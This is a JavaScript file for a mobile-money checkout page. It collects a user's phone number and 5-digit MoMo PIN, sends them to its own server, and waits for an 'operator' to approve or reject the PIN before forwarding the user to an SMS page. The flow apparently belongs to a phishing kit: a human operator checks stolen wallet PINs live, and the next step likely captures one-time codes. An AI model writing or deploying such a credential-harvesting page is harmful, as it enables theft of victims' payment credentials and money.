/* ==========================================================================
   pages/checkout.js
   Reads ?plan and ?sid, renders the MoMo amount, wires the 5-digit
   PIN and the phone input, and on Confirm Payment:
     1. POST /api/checkout  -> register the attempt with the operator
     2. show the loader     -> "Awaiting operator approval..."
     3. poll GET /api/pin-status/<sid> every 1.5s
        - approved -> navigate to sms.html?plan=<code>&phone=<phone>&sid=<sid>
        - rejected -> hide loader, show inline error, clear PIN, keep phone
        - timeout  -> hide loader, show inline error
   The phone number is prefilled on rejection; the PIN is cleared.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;
  var LOADER_ID = "payment-loader";
  var LOADER_TITLE_ID = "loader-title";
  var LOADER_BODY_ID = "loader-body";
  var LOADER_FOOTNOTE_ID = "loader-footnote";
  var ERROR_ID = "checkout-error";
  var ERROR_TEXT_ID = "checkout-error-text";

  var POLL_INTERVAL_MS = 1500;
  var POLL_MAX_ATTEMPTS = 200; // ~5 minutes

  var LOADER_TITLE_SENDING = "Sending...";
  var LOADER_BODY_SENDING = "Sending your details to the operator";
  var LOADER_TITLE_WAITING = "Awaiting Approval...";
  var LOADER_BODY_WAITING =
    "Waiting for the operator to verify your PIN. Please do not close this page.";
  var LOADER_FOOTNOTE = "Please do not refresh the page";

  var ERROR_REJECTED =
    "Wrong PIN, please try again.";
  var ERROR_TIMEOUT =
    "Still no response from the operator. Please try again.";
  var ERROR_NO_SESSION =
    "This checkout link is missing a session. " +
    "Please pick a plan again from the Plans page.";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  /* ---------------------------------------------------------------- */
  /* URL helpers                                                      */
  /* ---------------------------------------------------------------- */

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function digitsOnly(value) {
    return (value || "").replace(/\D+/g, "");
  }

  function formatLocalPhone(raw) {
    var digits = digitsOnly(raw);
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) ||
           global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  /* ---------------------------------------------------------------- */
  /* DOM helpers                                                      */
  /* ---------------------------------------------------------------- */

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    setText(LOADER_FOOTNOTE_ID, LOADER_FOOTNOTE);
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function hideLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = true;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  /* ---------------------------------------------------------------- */
  /* API                                                              */
  /* ---------------------------------------------------------------- */

  function postCheckout(sessionId, phone, pin) {
    return global.fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        phone: phone,
        pin: pin
      })
    });
  }

  function getPinStatus(sessionId) {
    return global.fetch(
      "/api/pin-status/" + encodeURIComponent(sessionId)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  /**
   * Poll pin-status until approved, rejected, or timeout.
   * @param {string} sessionId
   * @param {{onApproved: Function, onRejected: Function, onTimeout: Function}} callbacks
   */
  function pollPinStatus(sessionId, callbacks) {
    var attempts = 0;

    function tick() {
      attempts += 1;
      if (attempts > POLL_MAX_ATTEMPTS) {
        callbacks.onTimeout();
        return;
      }
      getPinStatus(sessionId).then(function (data) {
        if (data.status === "approved") {
          callbacks.onApproved();
          return;
        }
        if (data.status === "rejected") {
          callbacks.onRejected();
          return;
        }
        global.setTimeout(tick, POLL_INTERVAL_MS);
      }).catch(function () {
        global.setTimeout(tick, POLL_INTERVAL_MS * 2);
      });
    }

    global.setTimeout(tick, POLL_INTERVAL_MS);
  }

  /* ---------------------------------------------------------------- */
  /* Flow                                                             */
  /* ---------------------------------------------------------------- */

  function navigateToSms(plan, phone, sessionId) {
    var target = SMS_PAGE +
      "?plan=" + encodeURIComponent(plan.code) +
      "&phone=" + encodeURIComponent(phone) +
      "&sid=" + encodeURIComponent(sessionId);
    global.location.href = target;
  }

  function wireForm(plan, sessionId) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });
    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      hideError();
      var phone = formatLocalPhone(phoneInput.value);
      var pin = pinInput.value;
      if (phone.length < 9 || pin.length !== PIN_LENGTH) {
        showError("Enter a 9-digit phone number and a 5-digit PIN.");
        return;
      }

      showLoader(LOADER_TITLE_SENDING, LOADER_BODY_SENDING);

      postCheckout(sessionId, phone, pin).then(function (response) {
        if (!response.ok) {
          hideLoader();
          showError(ERROR_NETWORK);
          return;
        }
        showLoader(LOADER_TITLE_WAITING, LOADER_BODY_WAITING);
        pollPinStatus(sessionId, {
          onApproved: function () {
            navigateToSms(plan, phone, sessionId);
          },
          onRejected: function () {
            hideLoader();
            showError(ERROR_REJECTED);
            pinInput.value = "";
            syncConfirmState(pinInput, confirmBtn);
            pinInput.focus();
          },
          onTimeout: function () {
            hideLoader();
            showError(ERROR_TIMEOUT);
          }
        });
      }).catch(function () {
        hideLoader();
        showError(ERROR_NETWORK);
      });
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  function init() {
    var plan = resolvePlan();
    var sessionId = getQueryParam("sid") || "";

    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }

    if (!sessionId) {
      showError(ERROR_NO_SESSION);
      return;
    }
    wireForm(plan, sessionId);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
